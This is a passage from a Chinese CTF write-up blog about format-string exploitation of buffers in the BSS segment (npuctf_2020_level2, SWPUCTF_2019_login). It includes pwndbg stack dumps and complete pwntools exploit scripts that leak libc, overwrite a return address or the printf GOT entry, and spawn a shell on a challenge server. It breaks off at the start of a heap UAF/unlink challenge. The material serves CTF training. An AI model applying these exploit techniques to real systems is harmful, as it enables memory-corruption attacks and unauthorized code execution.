
```c
pwndbg> stack 6000:0000│ rsp 0x7fffffffdfb8 —▸ 0x5555555547f5 (main+91) ◂— lea rsi, [rip + 0xb8]01:0008│ rbp 0x7fffffffdfc0 —▸ 0x555555554830 (\_\_libc\_csu\_init) ◂— push r1502:0010│ 0x7fffffffdfc8 —▸ 0x7ffff7a03bf7 (\_\_libc\_start\_main+231) ◂— mov edi, eax03:0018│ 0x7fffffffdfd0 ◂— 0x104:0020│ 0x7fffffffdfd8 —▸ 0x7fffffffe0a8 —▸ 0x7fffffffe3d3 ◂— '/home/q/Desktop/npuctf\_2020\_level2'
```

`0x7fffffffdfd8` —▸ `0x7fffffffe0a8` —▸ `0x7fffffffe3d3` ◂— `/home/q/Desktop/npuctf_2020_level2` 这条链接就是 `args链`。

我们用 `%p` 泄露地址就可以知道其中 `0x7fffffffe0a8` 的偏移是 9，`0x7fffffffe3d3` 的偏移是 35。

不过因为不可能一次性写入非常大的数据我们的 `onegadget` 需要进行拆分分 2 次写入。

我们这里控制栈的返回地址也就是 `bp+8` 分 2 次写入 `onegadget`。

第一步改写偏移为 9 的地方为 `bp+8`。

然后写入一半的 `onegadget` 在偏移 35 处。

第二步重复不过是写入另外一半，对于数据的拆分 exp 中有，可以看下脚本运行的拆分结果。

因为最后 3 个字节是固定的前面的 `0x7f` 什么的都是动态的我们不用管反正在程序里面栈有栈的 `0x7fxxxx`，`libc` 有 `libc` 的我们只用改最后 3 个字节就行了。

```c
q@ubuntu:~/Desktop$ python2 bssformat.py[+] Starting local process './npuctf\_2020\_level2': pid 2940[+] Opening connection to node4.buuoj.cn on port 25838: Done[+] stack\_addr ===> 0x7ffc0e7814a8[+] libc\_addr ===> 0x7f52ca086638[+] stack\_ret\_addr ===> 0x7ffc0e7813c8[+] libc\_base\_addr ===> 0x7f52c9c9f000[+] one\_gadget ===> 0x7f52c9cee2c5[\*] one\_gadget1:0xe2c5[\*] one\_gadget2:0xce[\*] Switching to interactive mode
```

## 不过需要注意的是，因为我们写入的数据不算小的，还要用去输入一些 `junk code` 去刷新下缓冲区，然后 `sleep` 去等待刷新

exp

```python
from pwn import \*
import functools
LOG\_ADDR = lambda x, y: log.success('{} ===> {}'.format(x, hex(y)))
int16 = functools.partial(int, base=16)
context.update(arch='amd64', os='linux', endian='little')
r= process('./npuctf\_2020\_level2')
r=remote('node4.buuoj.cn','25838')
r.sendline("%9$p,%24$p")
msg = r.recvline()
stack\_addr, libc\_addr = msg[:-1].split(b',')
stack\_addr = int16(stack\_addr.decode())
libc\_addr = int16(libc\_addr.decode())
LOG\_ADDR('stack\_addr', stack\_addr)
LOG\_ADDR('libc\_addr', libc\_addr)
stack\_ret\_addr = stack\_addr - 0xe0
libc\_base\_addr = libc\_addr - 0x3e7638
LOG\_ADDR('stack\_ret\_addr', stack\_ret\_addr)
LOG\_ADDR('libc\_base\_addr', libc\_base\_addr)
gadgets = [0x4f2c5, 0x4f322, 0x10a38c]
one\_gadget = libc\_base\_addr + gadgets[0]
LOG\_ADDR('one\_gadget', one\_gadget)
sleep(1)
payload = "%{}c%9$hn".format((stack\_ret\_addr & 0xffff))
r.sendline(payload)
r.recv()
for \_ in range(2):
r.sendline('a' \* 0x30)
r.recv()
sleep(2)
payload = "%{}c%35$hn".format((one\_gadget & 0xffff)) + 'a' \* 0x10
r.sendline(payload)
r.recv()
sleep(2)
for \_ in range(2):
r.sendline('a' \* 0x30)
r.recv()
sleep(2)
payload = "%{}c%9$hhn".format((stack\_ret\_addr & 0xff) + 2)
r.sendline(payload)
r.recv()
sleep(2)
for \_ in range(2):
r.sendline('a' \* 0x30)
r.recv()
sleep(2)
payload = "%{}c%35$hhn".format(((one\_gadget >> 16) & 0xff)) + 'a' \* 0x10
r.sendline(payload)
r.recv()
sleep(2)
for \_ in range(2):
r.sendline('a' \* 0x30)
r.recv()
sleep(2)
r.send("6" \* 8 + '\x00' \* 8)
sleep(3)
r.sendline("cat flag")
r.interactive()
```

## 3.SWPUCTF_2019_login（BSS段上的格式化字符串利用，bp链）

和上面的题如出一辙，不过这个题呢没有 `args链` 可以用，有 `bp链` 我们改 `bp链`，`bp链` 如下。

在 `ebp` 指向的一条单链，这里没有开 `pie`，可以有条件进行 `got` 表更改。

```c
pwndbg> stack 40
00:0000│ esp 0xffffd110 —▸ 0xffffd158 —▸ 0xffffd168 —▸ 0xffffd178 ◂— 0x0
01:0004│ 0xffffd114 ◂— 0x32 /\* '2' \*/
02:0008│ 0xffffd118 —▸ 0x804b0a0 ◂— 0xa31 /\* '1\n' \*/
03:000c│ 0xffffd11c —▸ 0xf7ec4d87 (read+39) —▸ 0xfff0003d ◂— 0xfff0003d
04:0010│ 0xffffd120 —▸ 0xf7fb6d80 (\_IO\_2\_1\_stdout\_) ◂— 0xfbad2887
05:0014│ 0xffffd124 —▸ 0x804b0a0 ◂— 0xa31 /\* '1\n' \*/
06:0018│ 0xffffd128 —▸ 0xf7e45cab (puts+11) ◂— add edi, 0x170355
07:001c│ 0xffffd12c ◂— 0x0
08:0020│ 0xffffd130 —▸ 0xf7fb6000 (\_GLOBAL\_OFFSET\_TABLE\_) ◂— 0x1d7d8c
09:0024│ 0xffffd134 ◂— 0x0
0a:0028│ 0xffffd138 —▸ 0xf7fb6000 (\_GLOBAL\_OFFSET\_TABLE\_) ◂— 0x1d7d8c
0b:002c│ 0xffffd13c —▸ 0x8048572 ◂— add esp, 0x10
0c:0030│ 0xffffd140 ◂— 0x0
0d:0034│ 0xffffd144 —▸ 0x804b0a0 ◂— 0xa31 /\* '1\n' \*/
0e:0038│ 0xffffd148 ◂— 0x32 /\* '2' \*/
0f:003c│ 0xffffd14c —▸ 0x80485fb ◂— add esp, 0x10
10:0040│ 0xffffd150 —▸ 0x8048dfd ◂— push 0x6f6c6c65 /\* 'hello, %s' \*/
11:0044│ 0xffffd154 —▸ 0x804b080 ◂— 0xa31 /\* '1\n' \*/
12:0048│ ebp 0xffffd158 —▸ 0xffffd168 —▸ 0xffffd178 ◂— 0x0
13:004c│ 0xffffd15c —▸ 0x8048603 ◂— nop
14:0050│ 0xffffd160 —▸ 0x8048e20 ◂— inc edx /\* 'Base maybe not easy......
```

我们将 `got` 地址拆分成 4 部分写入，一共八次，前面四次写入 `got`，后面四次写入 `got+1`。

我们用 `%6$hhn` 来修改 `%10$` 处的数据，然后利用 `%10$hhn` 来修改 `%14$` 处的数据，使得 `%14$` 处为 `printf` 的 `GOT` 表地址，同样的方法，让 `%15$` 处为 `printf_got + 1` 的值，这样，我们在 `printf` 里用 `%14$hhn` 和 `%15$hn` 一次性完成对 `printf` 的 `got` 表数据后 3 字节完成了修改。第一个字节不用修改，因为都是一样的值。

需要的注意的是和 `args` 不一样，`bp链` 的利用需要复原 `bp链`，不然会有错误，因为返回地方是不对的，所以需要进行一个复原。

对于 `system` 函数的函数的写入要一次性去写入，不然会有指向错误，`system` 拆分两半不知道写哪里去了都。

exp

```python
#coding:utf8
from pwn import \*
from LibcSearcher import \*
import time
#r = process('./SWPUCTF\_2019\_login')
r = remote('node4.buuoj.cn','28653')
elf = ELF('./SWPUCTF\_2019\_login')
printf\_got = 0x804B014
r.sendafter('Please input your name: \n','dddd')
#泄露\_\_libc\_start\_main的地址
r.sendlineafter('Please input your password:','%15$p')
r.recvuntil('0x')
\_\_libc\_start\_main\_addr = int(r.recvuntil('\n',drop=True),16) - 0xF1
libc = LibcSearcher('\_\_libc\_start\_main',\_\_libc\_start\_main\_addr)
libc\_base = \_\_libc\_start\_main\_addr - libc.dump('\_\_libc\_start\_main')
system\_addr = libc\_base + libc.dump('system')
r.sendlineafter('Try again!\n','%10$p')
r.recvuntil('0x')
stack\_addr1 = int(r.recvuntil('\n',drop=True),16)
#写栈14$处的低1字节为0x14
payload = '%' + str(0x14) + 'c%10$hhn'
r.sendlineafter('Try again!\n',payload)
#变更10处的地址，+1
payload = '%' + str( (stack\_addr1 & 0xFF) + 1) + 'c%6$hhn'
r.sendlineafter('Try again!\n',payload)
#写栈14$处的低2字节为0xB0
payload = '%' + str(0xB0) + 'c%10$hhn'
r.sendlineafter('Try again!\n',payload)
#变更10处的地址，+2
payload = '%' + str( (stack\_addr1 & 0xFF) + 2) + 'c%6$hhn'
r.sendlineafter('Try again!\n',payload)
#写栈14$处的低3字节为0x04
payload = '%' + str(0x04) + 'c%10$hhn'
r.sendlineafter('Try again!\n',payload)
#变更10处的地址，+3
payload = '%' + str( (stack\_addr1 & 0xFF) + 3) + 'c%6$hhn'
r.sendlineafter('Try again!\n',payload)
#写栈14$处的低4字节为0x08
payload = '%' + str(0x08) + 'c%10$hhn'
r.sendlineafter('Try again!\n',payload)
############在$15处存入printf\_got+1################
#偏移4，指向$15
stack\_addr1 = stack\_addr1 + 4
payload = '%' + str( (stack\_addr1 & 0xFF)) + 'c%6$hhn'
r.sendlineafter('Try again!\n',payload)
#写栈15$处的低1字节为0x15
payload = '%' + str(0x15) + 'c%10$hhn'
r.sendlineafter('Try again!\n',payload)
#变更10处的地址，+1
payload = '%' + str( (stack\_addr1 & 0xFF) + 1) + 'c%6$hhn'
r.sendlineafter('Try again!\n',payload)
#写栈14$处的低2字节为0xB0
payload = '%' + str(0xB0) + 'c%10$hhn'
r.sendlineafter('Try again!\n',payload)
#变更10处的地址，+2
payload = '%' + str( (stack\_addr1 & 0xFF) + 2) + 'c%6$hhn'
r.sendlineafter('Try again!\n',payload)
#写栈14$处的低3字节为0x04
payload = '%' + str(0x04) + 'c%10$hhn'
r.sendlineafter('Try again!\n',payload)
#变更10处的地址，+3
payload = '%' + str( (stack\_addr1 & 0xFF) + 3) + 'c%6$hhn'
r.sendlineafter('Try again!\n',payload)
#写栈14$处的低4字节为0x08
payload = '%' + str(0x08) + 'c%10$hhn'
r.sendlineafter('Try again!\n',payload)
#复原10处的数据
payload = '%' + str( ((stack\_addr1-4) & 0xFF)) + 'c%6$hhn'
r.sendlineafter('Try again!\n',payload)
#现在%14$处存着的就是printf的GOT表地址
#我们开始来改写GOT表
#需要一次性将printf的got修改为system
#写低1字节
payload = '%' + str(system\_addr & 0xFF) + 'c%14$hhn'
#写低2、3字节
payload += '%' + str(((system\_addr & 0xFFFF00)>>8)-0x10) + 'c%15$hn'
r.sendlineafter('Try again!\n',payload)
#getrell
time.sleep(0.5)
r.sendline('/bin/sh')
r.interactive()
```

## 4.简单总结下bss段上的格式化

总体分为 2 大类，`bp链`，`args链` 的利用。

1. `args链`，`args链` 一般指向是这样的 `chain1->chain2->chain3`。

我们要做的就是更改 `chain2` 为 `bp+4(8)`，`chain3` 为 `onegadget` 或者 `system`。

主要对地址的拆分掌握。

2. `bss链`，同样为 `chain1->chain2->chain3`。

我们修改 `chain2` 为 `chain3` 的地址让 `chain3` 改为 `printf` 的 `got` 表。

然后再把 `chain2+4` 继续一步步更改 `printf` 的 `got` 加 1。

最后拆分写入 `system`。

## 8月8月

## 1.jarvisoj_level6_x64(堆溢出+UAF+unlink)

题目是 `Ubuntu16` 的，说实话我更喜欢有 `tcache`，因为他的漏洞更好用更多。

这道题他的溢出 emmm 不太一样，一般我们溢出是直接可以盖过去的，他是直接转为生成一个 `chunk`。

这里最小的 `chunk` 是 `0x90` 大小。

`v4 = malloc((128 - v3 % 128) % 128 + v3);`

溢出生成的那个 `chunk` 大小刚好在 `unsortedbin`，通过溢出去泄露不太行，

我们这里的话还是用 `UAF` 漏洞去玩玩吧。

### 思路：

1. 泄露 `heap_base`

这里的话我们玩他的 `fd` `bk` 指针。

申请 4 个 `chunk` 分别是 0,1,2,3。
